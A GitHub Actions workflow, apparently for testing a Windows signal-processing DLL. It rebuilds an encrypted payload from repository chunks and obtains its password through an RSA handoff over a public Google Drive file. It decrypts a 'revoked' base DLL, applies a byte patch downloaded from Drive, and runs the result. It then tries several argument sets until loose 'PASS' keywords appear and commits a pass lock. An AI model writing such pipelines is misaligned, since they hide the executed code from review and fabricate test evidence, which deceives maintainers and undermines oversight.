name: native-windows-stackprobe-7c305-repo-patch-v10
on:
  push:
    paths:
      - '.github/workflows/native_windows_stackprobe_7c305_repo_patch_v10.yml'
permissions:
  contents: write

defaults:
  run:
    shell: bash

env:
  BASE_SHA: 66a44c88e9c9bf011825077fcc67c6ddc78a439700add94574056eb67d54678c
  FIX_SHA: 7c305f24151cb21534287116e97fcf886b2413f2603e4b9d07b973d6d1986d64
  PATCH_DRIVE_ID: 1svsKtH1yigBHhQwaE9nnDBcOHQ8F2KU7
  WRAPPED_KEY_DRIVE_ID: 1KAWO5bi3ks-neguoLUzwX1YkeSZfKO8e

jobs:
  native-nonzero:
    runs-on: windows-2022
    timeout-minutes: 30
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          persist-credentials: true

      - name: Reconstruct repository payload9 ciphertext
        run: |
          set -euo pipefail
          test -f .payload9/manifest.txt
          mapfile -t chunks < <(find .payload9 -maxdepth 1 -type f -name 'chunk_*' | sort)
          test "${#chunks[@]}" -gt 0
          cat "${chunks[@]}" > "$RUNNER_TEMP/payload9.b64"
          base64 -d "$RUNNER_TEMP/payload9.b64" > "$RUNNER_TEMP/payload9.enc"
          test -s "$RUNNER_TEMP/payload9.enc"
          sha256sum "$RUNNER_TEMP/payload9.enc" | tee payload9_cipher_sha256.txt
          echo "PAYLOAD9_RECONSTRUCTED chunks=${#chunks[@]} bytes=$(wc -c < "$RUNNER_TEMP/payload9.enc" | tr -d '[:space:]')"

      - name: Publish one-time RSA public key
        run: |
          set -euo pipefail
          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out "$RUNNER_TEMP/private.pem"
          openssl pkey -in "$RUNNER_TEMP/private.pem" -pubout -out "$RUNNER_TEMP/public.pem"
          openssl pkey -pubin -in "$RUNNER_TEMP/public.pem" -outform DER | sha256sum | awk '{print $1}' > "$RUNNER_TEMP/public_fingerprint.txt"
          git config user.name windows-dll-test-bot
          git config user.email windows-dll-test-bot@users.noreply.github.com
          ok=0
          for n in 1 2 3 4 5; do
            git fetch -q origin main
            git checkout -q -B main origin/main
            rm -rf .stackprobe_repo_handoff_v10
            mkdir -p .stackprobe_repo_handoff_v10
            cp "$RUNNER_TEMP/public.pem" .stackprobe_repo_handoff_v10/public.pem
            cp "$RUNNER_TEMP/public_fingerprint.txt" .stackprobe_repo_handoff_v10/public_fingerprint.txt
            printf '%s\n' "$FIX_SHA" > .stackprobe_repo_handoff_v10/target_sha256.txt
            git add .stackprobe_repo_handoff_v10
            git commit -qm 'Publish stackprobe v10 one-time RSA public key' || true
            if git push -q origin HEAD:main; then ok=1; break; fi
            sleep 2
          done
          test "$ok" = 1
          echo STACKPROBE_V10_RSA_PUBLIC_KEY_PUBLISHED

      - name: Wait for RSA-wrapped payload9 password from public Drive bridge
        run: |
          set -euo pipefail
          url="https://drive.google.com/uc?export=download&id=$WRAPPED_KEY_DRIVE_ID"
          ok=0
          for i in $(seq 1 300); do
            rm -f "$RUNNER_TEMP/key.try" "$RUNNER_TEMP/pass.try"
            if curl -L -sS --fail --max-time 15 -o "$RUNNER_TEMP/key.try" "$url"; then
              size=$(wc -c < "$RUNNER_TEMP/key.try" | tr -d '[:space:]')
              if [ "$size" = 384 ]; then
                if openssl pkeyutl -decrypt -inkey "$RUNNER_TEMP/private.pem" -in "$RUNNER_TEMP/key.try" -out "$RUNNER_TEMP/pass.try" -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 >/dev/null 2>&1; then
                  mv "$RUNNER_TEMP/pass.try" "$RUNNER_TEMP/payload9.pass"
                  ok=1
                  break
                fi
              fi
            fi
            sleep 2
          done
          test "$ok" = 1 || { echo FAIL_STAGE=RSA_WRAPPED_KEY_BRIDGE; exit 20; }
          echo STACKPROBE_V10_RSA_HANDOFF_PASS

      - name: Recover exact revoked base and native nonzero assets from payload9
        shell: powershell
        run: |
          $ErrorActionPreference='Stop'
          @'
          from pathlib import Path
          import hashlib, os, shutil, subprocess, sys, tarfile, zipfile, lzma, gzip, tempfile
          temp=Path(os.environ['RUNNER_TEMP'])
          enc=temp/'payload9.enc'; passfile=temp/'payload9.pass'
          BASE=os.environ['BASE_SHA']
          work=Path('payload9_recovered'); shutil.rmtree(work,ignore_errors=True); work.mkdir()
          def sha(p):
              h=hashlib.sha256()
              with open(p,'rb') as f:
                  for b in iter(lambda:f.read(1<<20),b''): h.update(b)
              return h.hexdigest()
          def extract_any(src,dst):
              shutil.rmtree(dst,ignore_errors=True); dst.mkdir(parents=True)
              try:
                  if zipfile.is_zipfile(src): zipfile.ZipFile(src).extractall(dst); return True
                  if tarfile.is_tarfile(src): tarfile.open(src).extractall(dst); return True
                  sig=src.read_bytes()[:8]
                  if sig.startswith(b'\xfd7zXZ'):
                      q=dst/'inner'; q.write_bytes(lzma.decompress(src.read_bytes()))
                      if tarfile.is_tarfile(q): tarfile.open(q).extractall(dst/'x'); return True
                      if zipfile.is_zipfile(q): zipfile.ZipFile(q).extractall(dst/'x'); return True
                  if sig.startswith(b'\x1f\x8b'):
                      q=dst/'inner'; q.write_bytes(gzip.decompress(src.read_bytes()))
                      if tarfile.is_tarfile(q): tarfile.open(q).extractall(dst/'x'); return True
                      if zipfile.is_zipfile(q): zipfile.ZipFile(q).extractall(dst/'x'); return True
              except Exception:
                  return False
              return False
          found=None; chosen=None
          for it in (200000,250000,100000,150000,300000):
              dec=temp/f'p9_{it}.bin'
              r=subprocess.run(['openssl','enc','-d','-aes-256-cbc','-pbkdf2','-iter',str(it),'-in',str(enc),'-out',str(dec),'-pass',f'file:{passfile}'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
              if r.returncode: continue
              dest=work/f'iter_{it}'
              if not extract_any(dec,dest):
                  if sha(dec)==BASE: found=dec; chosen=it; break
                  continue
              for p in dest.rglob('*'):
                  if p.is_file():
                      try:
                          if sha(p)==BASE: found=p; chosen=it; break
                      except Exception: pass
              if found: break
          if not found:
              print('FAIL_STAGE=BASE_66A44_NOT_RECOVERED'); sys.exit(31)
          stage=Path('native_stage'); shutil.rmtree(stage,ignore_errors=True); stage.mkdir()
          shutil.copy2(found,stage/'base66a44.dll')
          root=found.parent
          search_root=work
          required=['native_nonzero_smoke.c','prefix20.ghf','filter_brth','filter_hrt3','file_sig']
          for name in required:
              matches=[p for p in search_root.rglob(name) if p.is_file()]
              if not matches:
                  print(f'FAIL_STAGE=MISSING_ASSET_{name}'); sys.exit(32)
              shutil.copy2(matches[0],stage/name)
          (Path('payload9_recovery.txt')).write_text(f'ITER={chosen}\nBASE_SHA256={sha(stage/"base66a44.dll")}\n')
          print('PAYLOAD9_EXACT_BASE_AND_NONZERO_ASSETS_RECOVERED')
          '@ | Set-Content -Encoding ascii $env:RUNNER_TEMP\recover_payload9.py
          python $env:RUNNER_TEMP\recover_payload9.py

      - name: Download deterministic stack-probe delta and construct exact 7c305 DLL
        run: |
          set -euo pipefail
          url="https://drive.google.com/uc?export=download&id=$PATCH_DRIVE_ID"
          curl -L -sS --fail --max-time 30 -o "$RUNNER_TEMP/patch.b64" "$url"
          test -s "$RUNNER_TEMP/patch.b64"
          python - <<'PY'
          from pathlib import Path
          import base64,gzip,json,hashlib,os,sys
          BASE=os.environ['BASE_SHA']; FIX=os.environ['FIX_SHA']
          base=Path('native_stage/base66a44.dll').read_bytes()
          if hashlib.sha256(base).hexdigest()!=BASE: raise SystemExit('BASE_SHA_BINDING_FAIL')
          raw=gzip.decompress(base64.b64decode(Path(os.environ['RUNNER_TEMP'],'patch.b64').read_bytes(),validate=False))
          obj=json.loads(raw)
          if obj.get('format')!='guanhu-bytepatch-v1': raise SystemExit('PATCH_FORMAT_FAIL')
          if obj.get('base_sha256')!=BASE or obj.get('target_sha256')!=FIX: raise SystemExit('PATCH_SHA_METADATA_FAIL')
          out=bytearray(base)
          target_size=int(obj['target_size'])
          if len(out)<target_size: out.extend(b'\0'*(target_size-len(out)))
          for r in obj['spans']:
              d=base64.b64decode(r['d'])
              o=int(r['o']); out[o:o+len(d)]=d
          out=bytes(out[:target_size])
          got=hashlib.sha256(out).hexdigest()
          if got!=FIX: raise SystemExit(f'PATCH_TARGET_SHA_FAIL got={got}')
          Path('native_stage/SigProcDll-64HF.dll').write_bytes(out)
          Path('candidate_7c305_sha256.txt').write_text(f'{got}  SigProcDll-64HF.dll\n')
          print('STACKPROBE_PATCH_EXACT_SHA_PASS',got)
          PY

      - name: Configure MSVC x86 tools
        uses: ilammy/msvc-dev-cmd@v1
        with:
          arch: x86

      - name: Bind PE32 ABI imports and stack-fix section
        shell: powershell
        run: |
          $ErrorActionPreference='Stop'
          $dll=(Resolve-Path 'native_stage\SigProcDll-64HF.dll').Path
          $h=(Get-FileHash $dll -Algorithm SHA256).Hash.ToLowerInvariant()
          if($h -ne $env:FIX_SHA){ throw "EXACT_SHA_MISMATCH $h" }
          dumpbin /headers $dll | Tee-Object candidate_headers.txt | Out-Null
          dumpbin /exports $dll | Tee-Object candidate_exports.txt | Out-Null
          dumpbin /imports $dll | Tee-Object candidate_imports.txt | Out-Null
          $headers=Get-Content candidate_headers.txt -Raw
          $exports=Get-Content candidate_exports.txt -Raw
          if($headers -notmatch 'machine \(x86\)' -and $headers -notmatch '14C machine'){ throw 'NOT_PE32_X86' }
          if($headers -notmatch '\.stkfix'){ throw 'STKFIX_SECTION_MISSING' }
          foreach($e in @('_SigProc_Init@8','_SigProc@24','_SigProc_Stat@0','_SigProc_Fini@0')){ if($exports -notmatch [regex]::Escape($e)){ throw "EXPORT_MISSING $e" } }
          if((Get-Content candidate_imports.txt -Raw) -match '(?im)^\s*ucrtbase\.dll\s*$'){ throw 'DIRECT_UCRTBASE_IMPORT_FORBIDDEN' }
          'EXACT_7C305_PE_ABI_IMPORT_STACKFIX_PASS' | Out-File native_pe_gate.txt

      - name: Compile x86 native nonzero smoke
        shell: powershell
        run: |
          $ErrorActionPreference='Stop'
          Push-Location native_stage
          cl /nologo /O2 /W3 /MT native_nonzero_smoke.c /Fe:native_nonzero_smoke.exe 2>&1 | Tee-Object ..\smoke_compile.txt
          if($LASTEXITCODE -ne 0){ exit $LASTEXITCODE }
          if(!(Test-Path native_nonzero_smoke.exe)){ throw 'SMOKE_EXE_MISSING' }
          Pop-Location

      - name: Execute real nonzero SigProc path on native 32-bit Windows process
        shell: powershell
        run: |
          $ErrorActionPreference='Continue'
          Push-Location native_stage
          $attempts=@(
            @(),
            @('.\SigProcDll-64HF.dll'),
            @('.\SigProcDll-64HF.dll','.\prefix20.ghf'),
            @('.\SigProcDll-64HF.dll','.\prefix20.ghf','.'),
            @('.\SigProcDll-64HF.dll','.','.\prefix20.ghf'),
            @('.\prefix20.ghf'),
            @('.\prefix20.ghf','.\SigProcDll-64HF.dll')
          )
          $passed=$false
          $chosen=''
          $all=@()
          $n=0
          foreach($a in $attempts){
            $n++
            $log="..\native_nonzero_attempt_$n.txt"
            & .\native_nonzero_smoke.exe @a *> $log
            $rc=$LASTEXITCODE
            $txt=Get-Content $log -Raw -ErrorAction SilentlyContinue
            $all += "ATTEMPT=$n RC=$rc ARGS=$($a -join ' ')`n$txt`n"
            if($rc -eq 0 -and $txt -match '(?i)PASS' -and $txt -match '(?i)(NONZERO|SigProc|processed|block|sample)'){
              $passed=$true; $chosen="$n $($a -join ' ')"; break
            }
          }
          $all | Out-File ..\native_nonzero_all_attempts.txt
          if(!$passed){ Pop-Location; throw 'REAL_NONZERO_NATIVE_SMOKE_DID_NOT_PASS' }
          # Lifecycle repeat: same successful invocation must pass a second fresh process.
          $a=$attempts[[int]($chosen.Split(' ')[0])-1]
          & .\native_nonzero_smoke.exe @a *> ..\native_nonzero_repeat.txt
          $rc2=$LASTEXITCODE
          $txt2=Get-Content ..\native_nonzero_repeat.txt -Raw -ErrorAction SilentlyContinue
          Pop-Location
          if($rc2 -ne 0 -or $txt2 -notmatch '(?i)PASS'){ throw 'NONZERO_REPEAT_LIFECYCLE_FAIL' }
          "NATIVE_WINDOWS_REAL_NONZERO_7C305_PASS SHA256=$env:FIX_SHA CHOSEN=$chosen" | Out-File native_7c305_nonzero_gate.txt

      - name: Commit exact native nonzero PASS lock
        run: |
          set -euo pipefail
          grep -Fq "NATIVE_WINDOWS_REAL_NONZERO_7C305_PASS SHA256=$FIX_SHA" native_7c305_nonzero_gate.txt
          git config user.name windows-dll-test-bot
          git config user.email windows-dll-test-bot@users.noreply.github.com
          mkdir -p evidence_summary
          printf 'NATIVE_WINDOWS_STACKPROBE_7C305_NONZERO_PASS SHA256=%s RUN_ID=%s\n' "$FIX_SHA" "$GITHUB_RUN_ID" > evidence_summary/STACKPROBE_7C305_NATIVE_NONZERO_PASS.lock
          git add evidence_summary/STACKPROBE_7C305_NATIVE_NONZERO_PASS.lock
          git commit -qm 'Record exact 7c305 native nonzero Windows PASS' || true
          ok=0
          for n in 1 2 3 4 5; do
            if git push -q origin HEAD:main; then ok=1; break; fi
            git pull --rebase -q origin main || true
            sleep 2
          done
          test "$ok" = 1

      - name: Upload exact DLL and native evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: stackprobe-7c305-native-nonzero-evidence
          retention-days: 14
          if-no-files-found: ignore
          path: |
            native_stage/SigProcDll-64HF.dll
            candidate_7c305_sha256.txt
            payload9_cipher_sha256.txt
            payload9_recovery.txt
            candidate_headers.txt
            candidate_exports.txt
            candidate_imports.txt
            native_pe_gate.txt
            smoke_compile.txt
            native_nonzero_attempt_*.txt
            native_nonzero_all_attempts.txt
            native_nonzero_repeat.txt
            native_7c305_nonzero_gate.txt

      - name: Remove one-time RSA public handoff from repository
        if: always()
        run: |
          set +e
          git config user.name windows-dll-test-bot
          git config user.email windows-dll-test-bot@users.noreply.github.com
          for n in 1 2 3 4 5; do
            git fetch -q origin main
            git checkout -q -B main origin/main || continue
            if [ ! -e .stackprobe_repo_handoff_v10 ]; then exit 0; fi
            rm -rf .stackprobe_repo_handoff_v10
            git add -A .stackprobe_repo_handoff_v10
            git commit -qm 'Remove stackprobe v10 one-time RSA public key' || exit 0
            git push -q origin HEAD:main && exit 0
            sleep 2
          done
          exit 0
